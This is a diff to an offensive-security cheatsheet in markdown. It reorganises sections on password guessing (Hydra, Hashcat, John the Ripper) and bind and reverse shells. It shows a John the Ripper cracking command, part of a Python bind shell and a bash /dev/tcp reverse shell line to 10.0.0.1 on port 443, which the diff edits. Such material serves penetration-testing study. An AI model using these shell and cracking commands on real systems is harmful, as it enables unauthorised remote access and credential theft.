@@ -10,15 +10,24 @@
   * [CVE-2014-6271](#cve-2014-6271)
 * [Juicy Potato](#juicy-potato)
 * [Shell via Samba Logon Command](#shell-via-samba-logon-command)
-
-# Cheatsheet - Password Guessing
-## Table of Contents
 * [Online](#online)
   * [Hydra](#hydra)
   * [Crowbar](#crowbar)
 * [Offline](#offline)
   * [Hashcat](#hashcat)
   * [John the Ripper](#john-the-ripper)
+* [Bind Shells](#bind-shells)
+  * [Python](#python-bind-shell)
+* [Reverse Shells](#reverse-shells)
+  * [BASH](#bash-reverse-shells) 
+  * [Msfvenom](#msfvenom-reverse-shells)
+  * [Netcat](#netcat-reverse-shells)
+  * [PowerShell](#powershell-reverse-shells)
+  * [Python](#python-reverse-shells)
+  * [JavaScript](#javascript-reverse-shells)
+* [Upgrade to a PTY Shell](#upgrade-to-a-pty-shell)
+  * [Python PTY Shell](#python-pty-shell) 
+
 
 ## Online
 ### Hydra
@@ -50,20 +59,6 @@ unshadow demo-passwd demo-shadow > demo-unshadow
 john demo-unshadow --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-# Cheatsheets - Shells
-## Table of Contents
-* [Bind Shells](#bind-shells)
-  * [Python](#python-bind-shell)
-* [Reverse Shells](#reverse-shells)
-  * [BASH](#bash-reverse-shells) 
-  * [Msfvenom](#msfvenom-reverse-shells)
-  * [Netcat](#netcat-reverse-shells)
-  * [PowerShell](#powershell-reverse-shells)
-  * [Python](#python-reverse-shells)
-  * [JavaScript](#javascript-reverse-shells)
-* [Upgrade to a PTY Shell](#upgrade-to-a-pty-shell)
-  * [Python PTY Shell](#python-pty-shell) 
-
 ## Bind Shells
 #### Python Bind Shell
 ```python
@@ -73,7 +68,7 @@ python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOC
 ## Reverse Shells
 #### Bash Reverse Shells
 ```bash
-bash -i >& /dev/tcp/10.0.0.1/443 0>&1
+/bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1
 ```
 
 #### Msfvenom Reverse Shells
